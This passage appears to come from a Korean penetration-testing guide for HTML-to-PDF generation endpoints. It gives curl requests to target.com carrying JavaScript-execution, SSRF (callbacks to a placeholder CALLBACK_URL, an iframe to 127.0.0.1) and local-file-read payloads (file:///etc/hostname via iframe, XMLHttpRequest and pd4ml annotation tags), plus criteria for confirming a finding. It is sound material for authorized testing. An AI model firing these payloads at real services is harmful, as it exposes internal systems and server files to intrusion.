### Phase 2: 동적 테스트 (검증)


**JavaScript 실행 테스트:**
```
# document.write로 JavaScript 실행 확인
curl -X POST "https://target.com/api/generate-pdf" \
  -H "Content-Type: application/json" \
  -d '{"content":"<script>document.write(\"JS_EXECUTED\")</script>"}'

# 서버 환경 정보 노출
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<script>document.write(window.location)</script>"}'
```

**SSRF 테스트 (외부 콜백):**
```
# img 태그로 외부 요청
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<img src=\"http://CALLBACK_URL/ssrf-pdf\">"}'

# link 태그
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<link rel=\"stylesheet\" href=\"http://CALLBACK_URL/ssrf-css\">"}'

# iframe으로 내부 서비스 응답 포함
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<iframe src=\"http://127.0.0.1:8080/\" width=\"800\" height=\"500\"></iframe>"}'
```

**LFI 테스트:**
```
# iframe으로 로컬 파일
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<iframe src=\"file:///etc/hostname\" width=\"800\" height=\"500\"></iframe>"}'

# XMLHttpRequest로 파일 읽기
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<script>x=new XMLHttpRequest();x.onload=function(){document.write(this.responseText)};x.open(\"GET\",\"file:///etc/hostname\");x.send();</script>"}'

# annotation 태그 (pd4ml 등)
curl -X POST "https://target.com/api/generate-pdf" \
  -d '{"content":"<annotation file=\"/etc/hostname\" content=\"/etc/hostname\" icon=\"Graph\" title=\"test\"/>"}'
```

**검증 방법:**
- 생성된 PDF를 다운로드하여 내용 확인
- PDF에 `JS_EXECUTED`, 파일 내용(`root:x:0:0:`), 내부 서비스 응답이 포함되어 있는지 확인
- 외부 콜백 서비스에서 서버로부터의 요청 수신 확인

**검증 기준:**
- **확인됨**: 동적 테스트로 PDF에 로컬 파일 내용이 포함되거나, SSRF로 외부 콜백 수신이 확인되거나, JavaScript 실행이 확인됨
